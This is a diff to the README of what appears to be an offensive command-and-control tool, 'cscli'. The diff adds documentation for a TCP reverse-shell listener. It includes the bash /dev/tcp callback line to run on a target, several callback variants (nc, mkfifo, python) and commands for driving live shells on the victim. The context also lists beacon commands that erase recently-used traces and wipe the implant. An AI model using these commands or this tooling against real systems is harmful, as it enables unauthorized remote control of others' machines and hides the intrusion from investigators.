@@ -78,6 +78,30 @@ The beacon exposes these taskable commands (also usable from the interactive
 | `cleanmru <path>` | remove a path from OS recently-used / MRU lists. |
 | `selfdestruct <path>` | wipe this beacon file + temp copies, then exit. |
 
+## Reverse shell (bash callback → interactive shell)
+
+Beyond the HTTP/HTTPS beacon, cscli provides a **raw TCP reverse-shell** listener
+that receives classic bash call-backs and gives you an interactive shell:
+
+```bash
+# interactive console
+cscli> reverse-shell 0.0.0.0 4444
+cscli> rsh-list
+cscli> rsh-shell rsh-1        # interactive shell on the target
+
+# or the non-interactive driver
+cscli --reverse-shell --host 0.0.0.0 --port 4444 --callback <PUBLIC_IP> --background
+#   -> JSON includes the callback command to run on the target:
+#      bash -i >& /dev/tcp/<PUBLIC_IP>/4444 0>&1
+cscli --rsh-list
+cscli --rsh-shell rsh-1 --command "id"     # one-shot command + output
+```
+
+Supported callback variants: `bash`, `nc`, `nc-e`, `mkfifo`, `python`. The
+driver daemon holds the live sockets and exposes session state + a command
+queue so a stateless CLI can drive them. (Reverse-shell control is inherently
+interactive; use `--rsh-shell <sid>` without `--command` for a terminal shell.)
+
 ## Compiled binary + PE delivery
 
 PyInstaller turns the beacon into a standalone executable (no Python needed on
@@ -247,6 +271,8 @@ python3 test_tls.py      # HTTPS + AES-GCM encrypted channel + module tasking
 python3 test_socks.py    # SOCKS5 pivot tunnels to an internal network
 python3 test_compiled.py # PyInstaller-compiled beacon executable end-to-end
 python3 test_cli_driver.py # non-interactive CLI driver (server/payload/list/task/wait)
+python3 test_rsh.py        # raw TCP reverse shell (real bash callback) in-process
+python3 test_rsh_cli.py    # reverse shell via the non-interactive CLI driver
 ```
 
 ## Layout
